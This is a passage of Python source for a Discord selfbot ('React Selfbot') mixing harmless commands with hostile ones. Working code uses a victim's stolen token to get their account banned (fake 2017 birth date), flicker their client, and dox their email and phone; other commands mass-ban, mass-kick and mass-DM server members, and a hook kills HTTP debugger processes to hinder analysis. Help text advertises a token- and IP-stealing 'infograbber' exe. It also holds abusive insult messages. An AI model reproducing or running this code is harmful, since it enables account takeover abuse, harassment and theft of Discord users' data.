        message1 = '''Not funny, didnt laugh. Your joke is so bad I would have preferred the joke went over my head and you gave up re-telling me the joke. To be honest this is a horrid attempt at trying to get a laugh out of me. Not a chuckle, not a hehe, not even a subtle burst of air out of my esophagus. Science says before you laugh your brain preps your face muscles but I didnt even feel the slightest twitch. 0/10 this joke is so bad I cannot believe anyone legally allowed you to be creative at all. The amount of brain power you must have put into that joke has the potential to power every house on Earth. Get a personality and learn how to make jokes, read a book. Im not saying this to be funny I genuinely mean it on how this is just bottom barrel embarrassment at comedy. Youve single handedly killed humor and every comedic act on the planet. Im so disappointed that society has failed as a whole in being able to teach you how to be funny.'''
        message2 = '''Honestly if I put in all my power and time to try and make your joke funny it would require Einstein himself to build a device to strap me into so I can be connected to the energy of a billion stars to do it, and even then all that joke would get from people is a subtle scuff. Youre lucky I still have the slightest of empathy for you after telling that joke otherwise I would have committed every war crime in the book just to prevent you from attempting any humor ever again. We should put that joke in text books so future generations can be wary of becoming such an absolute comedic failure. Im disappointed, hurt, and outright offended that my precious time has been wasted in my brain understanding that joke. In the time that took I was planning on helping kids who have been orphaned, but because of that youve wasted my time explaining the obscene integrity of your terrible attempt at comedy. Now those kids are suffering without meals and theres nobody to blame but you. I hope youre happy with what you have done and I truly hope you can move on and learn from this piss poor attempt.'''
        message3 = '''What you just actually posted basically has absolutely 0 sense of cohesion or comedy in a subtle way. It''s for all intents and purposes such a horrid attempt at communication I specifically am surprised you particularly are even able to basically exist in society, or so they for all intents and purposes thought. If it literally was a joke, it may really have been the for all intents and purposes worse joke i ever heard in my life, since it lacks any qualities actually your really normal joke would particularly have in a subtle way. If it particularly was supposed to for all intents and purposes be a particularly normal sentence, then it definitely fails as that too, as what you just really said literally makes absolutely no sense, which definitely shows that it's pretty such a horrid attempt at communication I actually am surprised you basically are even able to actually exist in society in a subtle way. It's so dumb, a cave man would really be able to really speak definitely more cleverly and for all intents and purposes more nuanced than you in a kind of big way. I for the most part am so ashamed of having to specifically see this, it's just sad, demonstrating how if it for all intents and purposes was supposed to generally be a really normal sentence, then it actually fails as that too, as what you just generally said for the most part makes absolutely no sense, which really shows that it's for all intents and purposes such a horrid attempt at communication I literally am surprised you mostly are even able to particularly exist in society in a for all intents and purposes big way.'''
        message4 = '''Your lack of brain cells doesn't definitely help you either, but if you generally wanna really try and mostly talk with me you mostly gotta kind of speak normally you idiotic piece of shit, particularly further showing how if it basically was a joke, it may particularly have been the much worse joke i ever heard in my life, since it lacks any qualities actually your basically normal joke would basically have, very contrary to popular belief. I honestly essentially think they should particularly put you in the mental hospital, but not for improving particularly your brain, but rather mostly keep you out of society so no one definitely has to kind of deal with particularly your crap, demonstrating how i kind of am so ashamed of having to actually see this, it's just sad, demonstrating how if it literally was supposed to specifically be a definitely normal sentence, then it specifically fails as that too, as what you just really said mostly makes absolutely no sense, which kind of shows that it's really such a horrid attempt at communication I kind of am surprised you particularly are even able to for the most part exist in society, for all intents and purposes contrary to popular belief. Your stupidity will kind of be essentially remembered forever as a very prime example of why humanity kind of is on a downwards spiral, generally further showing how it's generally such a horrid attempt at communication I for all intents and purposes am surprised you essentially are even able to literally exist in society, sort of contrary to popular belief'''
        await ctx.send(message1)
        await ctx.send(message2)
        await ctx.send(message3)
        await ctx.send(message4)

    def leetText(text):
        getchar = lambda c: chars[c] if c in chars else c
        chars = {"a":"4","e":"3","l":"1","o":"0","s":"5", "A": "4", "E": "3", "L": "1", "O": "0", "S": "5"}
        return ''.join(getchar(c) for c in text)

    @bot.command(aliases=['leet', '1337'])
    async def _1337(ctx, *, message: str=None):
        await ctx.message.delete()
        await ctx.send(leetText(message))

    @bot.command(aliases=['8ball'])
    async def _8ball(ctx, *, question: str=None):
        await ctx.message.delete()
        responses = [
            "It is certain.",
            "It is decidedly so.",
            "Without a doubt.",
            "Yes - definitely.",
            "You may rely on it.",
            "As I see it, yes.",
            "Most likely.",
            "Outlook good.",
            "Yes.",
            "Signs point to yes.",
            "Reply hazy, try again.",
            "Ask again later.",
            "Better not tell you now.",
            "Cannot predict now.",
            "Concentrate and ask again.",
            "Don't count on it.",
            "My reply is no.",
            "My sources say no.",
            "Outlook not so good.",
            "Very doubtful."]
        embed = discord.Embed(color=embed_color, title='ðŸŽ± 8 Ball ðŸŽ±', description=f'Question: {question}
Answer: {random.choice(responses)}', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://images-ext-1.discordapp.net/external/VYqaCgz1VS1RHIKSR7mtKxaMUmCSrRPH6HaV2NdHN4o/https/www.vippng.com/png/full/0-3078_download-png-image-report-8-ball-icon-png.png?width=911&height=911')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def hypesquad(ctx, house: str=None):
        await ctx.message.delete()
        async with httpx.AsyncClient() as client:
            if house.lower() == 'Bravery'.lower():
                await client.post('https://discord.com/api/v6/hypesquad/online', json={'house_id': 1}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='Hypesquad', description=f'Changed Hypesquad House to Bravery', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.set_thumbnail(url='https://emoji.gg/assets/emoji/bravery.png')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
            elif house.lower() == 'Balance'.lower():
                await client.post('https://discord.com/api/v6/hypesquad/online', json={'house_id': 3}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='Hypesquad', description=f'Changed Hypesquad House to Balance', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.set_thumbnail(url='https://vignette.wikia.nocookie.net/hypesquad/images/4/4f/BalanceLogo.png/revision/latest?cb=20180825045553')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
            elif house.lower() == 'Brilliance'.lower():
                await client.post('https://discord.com/api/v6/hypesquad/online', json={'house_id': 2}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='Hypesquad', description=f'Changed Hypesquad House to Brilliance', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.set_thumbnail(url='https://vignette.wikia.nocookie.net/hypesquad/images/8/8f/BrillianceLogo.png/revision/latest/scale-to-width-down/340?cb=20180825045035')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
            else:
                return

    @bot.command()
    async def embed(ctx, title, *, text):
        await ctx.message.delete()
        embed = discord.Embed(color=embed_color, title=title, description=text, timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed)

    @bot.command(aliases=['911'])
    async def _911(ctx):
        await ctx.message.delete()
        first = r'''
                    ,-------------------.
                   ,'                    ;
                 ,'                    .'|
               ,'                    .'# |
             ,'                    .'# # |
             :-------------------.'# # # | 
             | # # # # # # # # # | # # # |
             | # # # # # # # # # | # # # |
             | # # # # # # # # # | # # # |
             | # # # # # # # # # | # # # |
             | # # # # # # # # # | # # # |
             | # # # # # # # # # | # # # |
             | #,-'. # # # # # # | # # # |
             |_/'  / # # # # # # | # # # |
       _.--""     /_ # # # # # # | # # #  
      '__.--,       `-.# # # # # | # #    
           /  /''`--.__; # # # # | #      
       _,|\ ,'  # # # # # # # # #|       
      `--|._`.                            
        '''
        second = r'''
                        ,-------------------.
                      ,'                    ;
                    ,'                    .'|
                  ,'                    .'# |
                ,'                    .'# # |888
                :-------------------.'# # # |)(888)
                | # # # # # # # # # | # # # |8888)(8)
                | # # # # # # # # # | # # # |88)(88) 
             '  | # # # # # # # # # | # # # |8)(88)  
         |  / - , # ####### # # # # | # # # |(8)
      -   / , .   ############# # # | # # # |   
       \  -  ,  '#################  | # # # |
      -  .  /  \ /############## #  | # # # |
               .  - / # # # # # # # | # # # |
                | # # # # # # # # # | # # # |
                | # # # # # # # # # | # # # |
                | # # # # # # # # # | # # #
                | # # # # # # # # # | # #  
                | # # # # # # # # # | # 
                | # # # # # # # # # |      
        '''

        third = r'''
                    ,-------------------.     
                  ,'                    ;  '::
                ,'                    .'|'::::
         ::.: ,'                    .'# |::::':
     ':':.: ,'                    .'# # |::':::'
      :'. : :-------------------.'# # # |':::'::
       :::.:| # # # # # # # # # | # # # |:::::'
      ::.:..| # # # # # # # # # | # # # |::'
     `:;.::'| # # # # # # # # # | # # # |
     '::..:'| #.:::.. # # # # # | # # # |
       :::::|.,:.:::::::..::# # | # # # |
      `:::::::::::.::..:#::::.# | # # # |
        `:':::`::'.::::. :: # # | # # # |
        ,`::::::::::'::'::' # # | # # # |
     `:;.::'| # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # 
            | # # # # # # # # # | # #   
            | # # # # # # # # # | #     
            | # # # # # # # # # |       
            '''
        embed = discord.Embed(color=embed_color, description=f"```{first}```",timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_footer(text=embed_footer)
        firstsent = await ctx.send(embed=embed)
        await asyncio.sleep(1)
        embed2 = discord.Embed(color=embed_color, description=f"```{second}```",timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed2.set_footer(text=embed_footer)
        await firstsent.edit(embed=embed2)
        await asyncio.sleep(1)
        embed3 = discord.Embed(color=embed_color, description=f"```{third}```",timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed3.set_footer(text=embed_footer)
        await firstsent.edit(embed=embed3)

    @bot.command()
    async def covid(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://api.covid19api.com/summary')
        data = request.json()
        info = data['Global']
        totalconfirmed = info['TotalConfirmed']
        totalrecovered = info['TotalRecovered']
        totaldeaths = info['TotalDeaths']
        newconfirmed = info['NewConfirmed']
        newrecovered = info['NewRecovered']
        newdeaths = info['NewDeaths']
        embed = discord.Embed(color=embed_color, title='COVID-19 Live Stats', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name=f'Total Confirmed Cases', value=f'{totalconfirmed}', inline=True)
        embed.add_field(name=f'Total Deaths', value=f'{totaldeaths}', inline=True)
        embed.add_field(name=f'Total Recovered', value=f'{totalrecovered}', inline=True)
        embed.add_field(name=f'New Confirmed Cases', value=f'{newconfirmed}', inline=True)
        embed.add_field(name=f'New Deaths', value=f'{newdeaths}', inline=True)
        embed.add_field(name=f'New Recovered', value=f'{newrecovered}', inline=True)
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/SARS-CoV-2_without_background.png/1020px-SARS-CoV-2_without_background.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)
    
    @bot.command()
    async def pcspecs(ctx):
        await ctx.message.delete()
        computer = wmi.WMI()
        os_info = computer.Win32_OperatingSystem()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        embed = discord.Embed(color=embed_color, title='My PC Specifications', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name=f'Platform', value=str(os_name).replace("'", "").replace("b", "", 1), inline=True)
        embed.add_field(name=f'Architecture', value=f'{platform.machine()}', inline=True)
        embed.add_field(name=f'RAM', value=f'{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB', inline=True)
        embed.add_field(name=f'Graphics Card', value=f'{computer.Win32_VideoController()[0].Name}', inline=True)
        embed.add_field(name=f'CPU', value=f'{computer.Win32_Processor()[0].Name}', inline=True)
        embed.set_thumbnail(url='https://img.pngio.com/pc-master-race-comptf-pc-master-race-png-294_294.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command(pass_context=True)
    async def react(ctx, msg: str, msg_id='last', channel='current', prefer_combine: bool=False):
        await ctx.message.delete()
        msg = msg.lower()

        msg_id = None if not msg_id.isdigit() else int(msg_id)

        limit = 25 if msg_id else 1

        reactions = []
        not_unicode_emoji_list = []
        react = ''
        emotes = re.findall(r'<a?:(?:[a-zA-Z0-9]+?):(?:[0-9]+?)>', msg)
        react = re.sub(r'<a?:([a-zA-Z0-9]+?):([0-9]+?)>', '', msg)

        for emote in emotes:
            reactions.append(discord.utils.get(bot.emojis, id=int(emote.split(':')[-1][:-1])))
            not_unicode_emoji_list.append(emote)

        react_original = react

        if has_dupe(react):
            if prefer_combine:
                react = replace_combos(react)

            react = replace_letters(react)

            if has_dupe(react):
                if not prefer_combine:
                    react = react_original
                    react = replace_combos(react)
                    react = replace_letters(react)
                    if has_dupe(react):
                        return
            
            lt_count = 0
            for char in react:
                if char not in '0123456789':
                    if char !=  'âƒ£':
                        reactions.append(char)
                else:
                    reactions.append(emoji_dict[char][0])
        else:
            lt_count = 0
            for char in react:
                if char in 'abcdefghijklmnopqrstuvwxyz0123456789!?':
                    reactions.append(emoji_dict[char][0])
                else:
                    reactions.append(char)
        
        if channel == 'current':
            async for message in ctx.message.channel.history(limit=limit):
                if (not msg_id and message.id != ctx.message.id) or (msg_id == message.id):
                    for i in reactions:
                        try:
                            await message.add_reaction(i)
                        except:
                            return

        else:
            found_channel = find_channel(ctx.guild.channels, channel)
            if not found_channel:
                found_channel = find_channel(bot.get_all_channels(), channel)
            if found_channel:
                async for message in found_channel.history(limit=limit):
                    if (not msg_id and message.id != ctx.message.id) or (msg_id == message.id):
                        for i in reactions:
                            try:
                                await message.add_reaction(i)
                            except:
                                return

            else:
                return

    @bot.command()
    async def fakedata(ctx, locale: str='en'):
        await ctx.message.delete()
        request = requests.get(f'http://api.over.menu/selfbot/fakedata')
        response = request.json()
        name = response['name']
        street = response['street']
        zipcode = response['zipcode']
        city = response['city']
        state = response['state']
        country = response['country']
        phone = response['phone']
        useragent = response['useragent']
        embed = discord.Embed(color=embed_color, title='Fake Data Generator', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name=f'Name', value=f'{name}', inline=True)
        embed.add_field(name=f'Street', value=f'{street}', inline=True)
        embed.add_field(name=f'Zipcode', value=f'{zipcode}', inline=True)
        embed.add_field(name=f'City', value=f'{city}', inline=True)
        embed.add_field(name=f'State', value=f'{state}', inline=True)
        embed.add_field(name=f'Country', value=f'{country}', inline=True)
        embed.add_field(name=f'Phone', value=f'{phone}', inline=True)
        embed.add_field(name=f'User Agent', value=f'{useragent}', inline=True)
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Deutscher_Personalausweis_im_ab_2021_vorgesehenen_Design%2C_Bundesregierung_der_Bundesrepublik_Deutschland%2C_Entwurf_eines_Gesetzes_zur_St%C3%A4rkung_der_Sicherheit_im_Pass-%2C_Ausweis-_und_ausl%C3%A4nderrechtlichen_Dokumentenwesen.jpeg/220px-thumbnail.jpeg')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def dmall(ctx, *, msg: str=None):
        await ctx.message.delete()
        if msg is not None:
            for member in ctx.guild.members:
                if member is not ctx.author:
                    try:
                        await member.send(msg)
                    except Exception as e:
                        print(e)
        else:
            print(Fore.RED + 'Missing arguments')

    @bot.command()
    async def banall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            if member is not ctx.author:
                try:
                    await member.ban()
                except Exception:
                    return
    
    @bot.command()
    async def kickall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            if member is not ctx.author:
                try:
                    await member.kick()
                except Exception:
                    return

    @bot.command()
    async def tokenfucker(ctx, token: str=None):
        await ctx.message.delete()
        try:
            while True:
                async with httpx.AsyncClient() as client:
                    await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "light"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "dark"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            return

    @bot.command()
    async def bantoken(ctx, token: str=None):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://discordapp.com/api/v6/users/@me', json={'date_of_birth': "2017-2-11"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            return

    @bot.command()
    async def dox(ctx, token: str=None):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                userinfo = await client.get('https://canary.discordapp.com/api/v6/users/@me', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                userdata = json.loads(userinfo.content)
                try:
                    userdata['premium_type']
                except Exception:
                    dnitro ="None"
                else:
                    if userdata['premium_type'] == 1:
                        dnitro ="Nitro Classic"

                    elif userdata['premium_type'] == 2:
                        dnitro ="Nitro"

                username = userdata['username']
                discriminator = userdata['discriminator']
                avatar_url = f"https://cdn.discordapp.com/avatars/{userdata['id']}/{userdata['avatar']}.jpg"
                email = userdata['email']
                phone = userdata['phone']
                verified = userdata['verified']
                locale = userdata['locale']
                mfa = userdata['mfa_enabled']
                nsfw = userdata['nsfw_allowed']
                embed = discord.Embed(color=embed_color, title='User Information', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.add_field(name=f'Username', value=f'{username}#{discriminator}', inline=False)
                embed.add_field(name=f'Email', value=email, inline=False)
                embed.add_field(name=f'Phone', value=phone, inline=False)
                embed.add_field(name=f'Nitro', value=dnitro, inline=False)
                embed.add_field(name=f'Verified', value=verified, inline=False)
                embed.add_field(name=f'Locale', value=locale, inline=False)
                embed.add_field(name=f'MFA Enabled', value=mfa, inline=False)
                embed.add_field(name=f'NSFW Allowed', value=nsfw, inline=False)
                embed.set_thumbnail(url=avatar_url)
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)

        except Exception:
            return

    @bot.command()
    async def delwebhook(ctx, webhook: str=None):
        await ctx.message.delete()
        try:
            while True:
                async with httpx.AsyncClient() as client:
                    await client.delete(webhook)
        except Exception:
            return

    @bot.command()
    async def cloneserver(ctx):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                originguild = ctx.guild
                result = await client.post('https://discordapp.com/api/v8/guilds', json={'name': f'{originguild.name} clone', 'guild_template_code': '2TffvPucqHkN'}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                cloneserverid = result.json()['id']
                print(cloneserverid)
        except Exception as e:
            print(e)

    @bot.command()
    async def online(ctx):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://discordapp.com/api/v8/users/@me/settings', json={'status': 'online'}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='User Status', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.add_field(name=f'New Status', value='Online', inline=True)
                embed.set_thumbnail(url='https://emoji.gg/assets/emoji/9166_online.png')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command()
    async def idle(ctx):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://discordapp.com/api/v8/users/@me/settings', json={'status': 'idle'}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='User Status', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.add_field(name=f'New Status', value='Idle', inline=True)
                embed.set_thumbnail(url='https://emoji.gg/assets/emoji/3929_idle.png')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command()
    async def dnd(ctx):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://discordapp.com/api/v8/users/@me/settings', json={'status': 'dnd'}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='User Status', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.add_field(name=f'New Status', value='Do not Disturb', inline=True)
                embed.set_thumbnail(url='https://emoji.gg/assets/emoji/7907_DND.png')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command()
    async def invisible(ctx):
        await ctx.message.delete()
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://discordapp.com/api/v8/users/@me/settings', json={'status': 'invisible'}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=embed_color, title='User Status', timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.add_field(name=f'New Status', value='Invisible', inline=True)
                embed.set_thumbnail(url='https://emoji.gg/assets/emoji/OfflineDOT.png')
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command(pass_context=True)
    async def calc(ctx, *, msg):
        await ctx.message.delete()
        equation = msg.strip().replace('^', '**').replace('x', '*')
        try:
            if '=' in equation:
                left = eval(equation.split('=')[0], {"__builtins__": None}, {"sqrt": sqrt})
                right = eval(equation.split('=')[1], {"__builtins__": None}, {"sqrt": sqrt})
                answer = str(left == right)
            else:
                answer = str(eval(equation, {"__builtins__": None}, {"sqrt": sqrt}))
        except TypeError:
            return
        embed = discord.Embed(color=embed_color, title='Calculator', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name=f'Equation', value=f'```{equation}```', inline=False)
        embed.add_field(name=f'Answer', value=f'{answer}', inline=False)
        embed.set_thumbnail(url='https://i.ibb.co/KNdNTSy/phone-icon-calculator-feature-phone-cartoon-calculation-mathematics-icon-design-office-equipment-png.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)
 
    @bot.command()
    async def rule34(ctx):
        await ctx.message.delete()
        try:
            request = requests.get(f'http://rule34.xxx/index.php?page=post&s=random')
            soup = BeautifulSoup(request.content, 'html.parser')
            link = soup.find(id="image").get("src")
            embed= discord.Embed(color=embed_color, title=f'Rule34', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_image(url=link)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command()
    async def choose(ctx, first: str=None, second: str=None):
        await ctx.message.delete()
        options = [first, second]
        embed = discord.Embed(color=embed_color, title='Choose', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name=f'Choice', value=random.choice(options), inline=False)
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def fnstats(ctx, name: str=None):
        await ctx.message.delete()
        request = requests.get(f'https://fortnite-api.com/v1/stats/br/v2?name={urllib.parse.quote(name)}')
        data = request.json()
        info = data['data']
        bplevel = info['battlePass']['level']
        totalwins = info['stats']['all']['overall']['wins']
        totalmatches = info['stats']['all']['overall']['matches']
        totalwinrate = info['stats']['all']['overall']['winRate']
        totalkills = info['stats']['all']['overall']['kills']
        totalkd = info['stats']['all']['overall']['kd']

        solowins = info['stats']['all']['solo']['wins']
        solomatches = info['stats']['all']['solo']['matches']
        solowinrate = info['stats']['all']['solo']['winRate']
        solokills = info['stats']['all']['solo']['kills']
        solokd = info['stats']['all']['solo']['kd']

        duowins = info['stats']['all']['duo']['wins']
        duomatches = info['stats']['all']['duo']['matches']
        duowinrate = info['stats']['all']['duo']['winRate']
        duokills = info['stats']['all']['duo']['kills']
        duokd = info['stats']['all']['duo']['kd']

        triowins = info['stats']['all']['trio']['wins']
        triomatches = info['stats']['all']['trio']['matches']
        triowinrate = info['stats']['all']['trio']['winRate']
        triokills = info['stats']['all']['trio']['kills']
        triokd = info['stats']['all']['trio']['kd']

        squadswins = info['stats']['all']['squad']['wins']
        squadsmatches = info['stats']['all']['squad']['matches']
        squadswinrate = info['stats']['all']['squad']['winRate']
        squadskills = info['stats']['all']['squad']['kills']
        squadskd = info['stats']['all']['squad']['kd']

        embed = discord.Embed(color=embed_color, title=f'Fortnite Stats of {name}', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name=f'Battle Pass Level', value=f'{bplevel}', inline=True)
        embed.add_field(name=f'Total', value=f'Wins: {totalwins} 
Matches: {totalmatches} 
Winrate: {totalwinrate}% 
Kills: {totalkills} 
KD: {totalkd}', inline=True)
        embed.add_field(name=f'Solo', value=f'Wins: {solowins} 
Matches: {solomatches} 
Winrate: {solowinrate}% 
Kills: {solokills} 
KD: {solokd}', inline=True)
        embed.add_field(name=f'Duo', value=f'Wins: {duowins} 
Matches: {duomatches} 
Winrate: {duowinrate}% 
Kills: {duokills} 
KD: {duokd}', inline=True)
        embed.add_field(name=f'Trio', value=f'Wins: {triowins} 
Matches: {triomatches} 
Winrate: {triowinrate}% 
Kills: {triokills} 
KD: {triokd}', inline=True)
        embed.add_field(name=f'Squads', value=f'Wins: {squadswins} 
Matches: {squadsmatches} 
Winrate: {squadswinrate}% 
Kills: {squadskills} 
KD: {squadskd}', inline=True)
        embed.set_thumbnail(url='https://i.pinimg.com/originals/a4/d8/f4/a4d8f43f8025bae2724a0eff1fe7e05c.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.event
    async def on_command(ctx):
        for proc in psutil.process_iter():
            try:
                processName = proc.name()
                if processName == "HTTPDebuggerUI.exe":
                    proc.terminate()
                    return
                if processName == "HTTPDebuggerSvc.exe":
                    proc.terminate()
                    return
            except:
                pass
        print(Fore.LIGHTWHITE_EX + Style.BRIGHT + f'Command Used | ' + Fore.LIGHTCYAN_EX + str(ctx.command))
        
    @bot.command()
    async def help(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}fun** | Shows the available fun commands
        **{prefix}info** | Shows the available info commands
        **{prefix}user** | Shows the available user commands
        **{prefix}server** | Shows the available server commands
        **{prefix}image** | Shows the available image commands
        **{prefix}nsfw** | Shows the available nsfw commands
        **{prefix}troll** | Shows the available troll commands
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)


    @bot.command()
    async def text(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}ascii <Text>** | Shows text in ASCII format
        **{prefix}spam <Amount> <Message>** | Spams a specific message specific amount of times
        **{prefix}poll <Message>** | Starts a poll with a specific message
        **{prefix}trumptweet <Tweet>** | Generates a Trump Tweet with a custom message
        **{prefix}phcomment <Text>** | Generates a PornHub comment with a custom message
        **{prefix}clyde <Text>** | Generates a ClydeBOT message
        **{prefix}reverse <Text>** | Reverses Text
        **{prefix}fliptext <Text>** | Flips the text upside down
        **{prefix}zalgo <Text>** | Adds Zalgo characters to a Text
        **{prefix}1337/leet <Text>** | Turns Text to a 1337/leet message
        **{prefix}notfunny** | Tells someone how unfunny they are
        **{prefix}loremipsum <Words>** | Generates a Lorem Ipsum text with a specified amount of words
        **{prefix}embed <Title> <Text>** | Sends and Embed with a custom title and text
        **{prefix}react <Text> [Message ID] [Channel] [Combine(true/false)]** | Reacts with the Text translated in Emotes
        **{prefix}afk** | Toggles AFK Mode
        **{prefix}uwumode** | Toggles UwU Mode
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Text Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def troll(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}gping <@User>** | Ghostpings an user
        **{prefix}invisibleping <User> <Message>** | Sends a message with an invisible ping
        **{prefix}fakenitro <Link>** | Generates fake Nitro URL
        **{prefix}fakelink <Fake Link> <Original Link>** | Sends a fake link
        **{prefix}dox <Token>** | Shows information about someones Discord Account
        **{prefix}tokenfucker <Token>** | Lets the Discord of someone flicker black and white
        **{prefix}bantoken <Token>** | Ban's someones Discord Account
        **{prefix}delwebhook <Webhook URL>** | Deletes a Webhook
        **{prefix}blackscreenurl** | Sends a URL which let's people who use Windows get a black screen
        **{prefix}infograbber <File Name> <Webhook URL>** | Creates a info grabber exe file which gets uploaded to anonfiles which grabs Discord tokens and IP Address
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Troll Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def nsfw(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}butt** | Shows a butt image
        **{prefix}boobs** | Shows a boobs image
        **{prefix}anal** | Shows a anal image
        **{prefix}porngif** | Shows a porn gif image
        **{prefix}hentai** | Shows a hentai image
        **{prefix}hentaianal** | Shows a hentai anal image
        **{prefix}hentaiboobs** | Shows a hentai boobs image
        **{prefix}hentaitentacle** | Shows a hentai tentacle image
        **{prefix}hentaibara** | Shows a hentai bara image
        **{prefix}rule34** | Sends a random rule34.xxx image
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available NSFW Commands')
